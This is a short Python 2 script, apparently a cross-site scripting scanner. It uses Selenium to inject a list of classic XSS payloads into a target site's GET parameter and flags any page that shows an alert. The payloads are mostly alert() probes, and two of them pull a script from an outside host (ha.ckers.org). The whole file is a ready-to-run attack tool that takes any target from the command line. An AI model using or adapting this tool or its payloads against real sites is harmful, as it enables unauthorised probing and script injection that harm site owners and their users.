#!/usr/bin/python

try:
 from selenium import webdriver
except:
 print 'you have to install selenium module '
 exit(1)
import time
import sys

xss=[
  ''';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>''',
  '''<IMG SRC="javascript:alert('XSS');">''',
  '''<IMG SRC=javascript:alert('XSS')> onerror=alert(1)''',
  '''<IMG SRC=JaVaScRiPt:alert('XSS')> onerror=alert(1)''',
  '''<IMG SRC=javascript:alert("XSS")> onerror=alert(1)''',
  '''<IMG SRC=`javascript:alert("RSnake says, 'XSS'")` onerror=aler(1)>''',
  '''<IMG """><SCRIPT>alert("XSS")</SCRIPT>">''',
  '''<IMG SRC=javascript:alert(String.fromCharCode(88,83,83)) onerror=alert(String.fromCharCode(88,83,83)) >''',
  '''%3CSCRIPT/XSS%20SRC=%22http://ha.ckers.org/xss.js%22%3E%3C/SCRIPT%3E''',
  '''<<SCRIPT>alert("XSS");//<</SCRIPT>''',
  '''<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >''',
  '''<IMG SRC="javascript:alert('XSS')"''',
  '''\";alert('XSS');//''',
  '''</TITLE><SCRIPT>alert("XSS");</SCRIPT>''',
  '''<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');" onerror=alert(1)>''',
  '''<BODY BACKGROUND="javascript:alert('XSS')" onerror=alert('1');>''',
  '''<BODY ONLOAD=alert('XSS')>''' 
 ]

if len(sys.argv)<=1:
   print 'invalid args\n[=]usage',sys.argv[0],' www.site.com/file.php?get='
   exit(1)
else:
   target=sys.argv[1]
   if not (target.startswith("http://") or target.startswith("https://")):
      print 'Wrong target , it should be starts with http:// or https://'
      exit(1)
   if not (target[-1] == '='):
      print 'Wrong target , it should end with get parameter '
      exit(1)


driver = webdriver.Firefox()
while len(xss)>0:
  full_target=target+xss.pop()
  
  
  #print 'Trying >>> ' ,full_target #uncomment of you want extra verbose  
  
  driver.get(full_target)
  time.sleep(1)
  try:
    alert = driver.switch_to_alert()
    alert.accept()
    driver.switch_to_default_content()
    print 'find vulne at ',full_target
  except Exception,r:
    #print r #uncomment if you want extra verbose 
    pass
